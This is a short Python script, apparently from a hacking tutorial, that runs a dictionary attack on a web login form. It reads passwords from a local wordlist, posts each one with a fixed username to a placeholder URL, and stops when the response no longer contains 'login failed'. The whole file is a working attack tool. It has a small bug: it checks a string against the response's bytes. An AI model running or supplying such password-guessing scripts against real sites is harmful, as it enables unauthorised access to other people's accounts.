"""Import modules"""
import requests
 


target_url = "http://SOME URL HERE"
data_dict = {"username": "testusername", "password": "1234", "login": "submit"}
#response = requests.post(target_url, data=data_dict)
#print(response.content)

with open("/home/user/passwords.txt", "r") as wordlist_file:
	for line in wordlist_file:
		word = line.strip()
		data_dict["password"] = word
		response = requests.post(target_url, data_dict)
		if "login failed" not in response.content:
			print("\n[+] Got the password ---> " + word)
			exit()
print("\n[+] Reached end of line.")

